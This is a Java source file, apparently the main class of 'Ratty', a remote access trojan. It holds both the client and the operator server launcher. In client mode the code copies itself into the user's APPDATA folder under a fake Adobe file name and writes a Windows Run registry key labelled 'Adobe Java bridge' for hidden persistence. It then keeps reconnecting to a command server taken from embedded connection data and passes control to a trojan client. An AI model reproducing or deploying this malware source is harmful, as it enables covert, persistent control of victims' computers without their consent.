package de.sogomn.rat;

import java.io.File;
import java.net.URI;
import java.util.ResourceBundle;

import javax.swing.JDialog;
import javax.swing.JFrame;
import javax.swing.JOptionPane;
import javax.swing.UIDefaults;
import javax.swing.UIManager;
import javax.swing.plaf.nimbus.NimbusLookAndFeel;

import de.sogomn.engine.util.FileUtils;
import de.sogomn.rat.server.ActiveServer;
import de.sogomn.rat.server.gui.RattyGuiController;

/*
 * This class is kinda hardcoded.
 * I don't care.
 * Sue me.
 */
public final class Ratty {
	
	public static final boolean DEBUG = true;
	public static final String VERSION = "1.16";
	public static final ResourceBundle LANGUAGE = ResourceBundle.getBundle("language.lang");
	
	private static String address;
	private static int port;
	private static boolean client;
	
	private static final int CONNECTION_INTERVAL = 5000;
	private static final String CONNECTION_DATA_FILE_NAME = "/connection_data.txt";
	private static final String STARTUP_FILE_PATH = System.getenv("APPDATA") + File.separator + "Adobe" + File.separator + "AIR" + File.separator + "jre13v3bridge.jar";
	private static final String STARTUP_REGISTRY_COMMAND = "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Adobe Java bridge\" /d \"" + STARTUP_FILE_PATH + "\"";
	
	private static final String PORT_INPUT_QUESTION = LANGUAGE.getString("server.port_question");
	private static final String PORT_ERROR_MESSAGE = LANGUAGE.getString("server.port_error");
	private static final String DEBUG_MESSAGE = LANGUAGE.getString("debug.question");
	private static final String DEBUG_SERVER = LANGUAGE.getString("debug.server");
	private static final String DEBUG_CLIENT = LANGUAGE.getString("debug.client");
	
	private Ratty() {
		//...
	}
	
	private static void setLookAndFeel() {
		final NimbusLookAndFeel nimbus = new NimbusLookAndFeel();
		final UIDefaults defaults = nimbus.getDefaults();
		
		JFrame.setDefaultLookAndFeelDecorated(true);
		JDialog.setDefaultLookAndFeelDecorated(true);
		GUISettings.setDefaults(defaults);
		
		try {
			UIManager.setLookAndFeel(nimbus);
		} catch (final Exception ex) {
			ex.printStackTrace();
		}
	}
	
	private static void readConnectionData() throws ArrayIndexOutOfBoundsException, NumberFormatException {
		final String[] lines = FileUtils.readInternalLines(CONNECTION_DATA_FILE_NAME);
		final String addressString = lines[0].trim();
		final String portString = lines[1].trim();
		final String clientString = lines[2].trim();
		
		address = addressString;
		port = Integer.parseInt(portString);
		client = Boolean.parseBoolean(clientString);
	}
	
	private static void addToStartup() {
		try {
			final URI sourceUri = Ratty.class.getProtectionDomain().getCodeSource().getLocation().toURI();
			final File source = new File(sourceUri);
			final File destination = new File(STARTUP_FILE_PATH);
			
			FileUtils.createFile(STARTUP_FILE_PATH);
			FileUtils.copyFile(source, destination);
			Runtime.getRuntime().exec(STARTUP_REGISTRY_COMMAND);
		} catch (final Exception ex) {
			ex.printStackTrace();
		}
	}
	
	private static int parsePort(final String input) {
		try {
			final int port = Integer.parseInt(input);
			
			/*65535 = Max port*/
			if (port < 0 || port > 65535) {
				return -1;
			}
			
			return port;
		} catch (final Exception ex) {
			return -1;
		}
	}
	
	public static void connectToHost(final String address, final int port) {
		final ActiveConnection newClient = new ActiveConnection(address, port);
		final Client trojan = new Client();
		
		if (!newClient.isOpen()) {
			try {
				Thread.sleep(CONNECTION_INTERVAL);
			} catch (final Exception ex) {
				//...
			} finally {
				System.gc();
				connectToHost(address, port);
			}
			
			return;
		}
		
		newClient.setObserver(trojan);
		newClient.start();
	}
	
	public static void startServer(final int port) {
		final ActiveServer server = new ActiveServer(port);
		final RattyGuiController controller = new RattyGuiController();
		
		server.setObserver(controller);
		server.start();
	}
	
	public static void main(final String[] args) {
		setLookAndFeel();
		readConnectionData();
		
		if (DEBUG) {
			final String[] options = {DEBUG_SERVER, DEBUG_CLIENT};
			final int input = JOptionPane.showOptionDialog(null, DEBUG_MESSAGE, null, JOptionPane.YES_NO_OPTION, JOptionPane.QUESTION_MESSAGE, null, options, null);
			
			if (input == JOptionPane.YES_OPTION) {
				System.out.println(DEBUG_SERVER);
				
				startServer(port);
			} else if (input == JOptionPane.NO_OPTION) {
				System.out.println(DEBUG_CLIENT);
				
				connectToHost(address, port);
			}
		} else if (client) {
			addToStartup();
			connectToHost(address, port);
		} else {
			final String input = JOptionPane.showInputDialog(PORT_INPUT_QUESTION);
			
			if (input == null) {
				return;
			}
			
			final int port = parsePort(input);
			
			if (port != -1) {
				startServer(port);
			} else {
				JOptionPane.showMessageDialog(null, PORT_ERROR_MESSAGE, null, JOptionPane.ERROR_MESSAGE);
			}
		}
	}
	
}
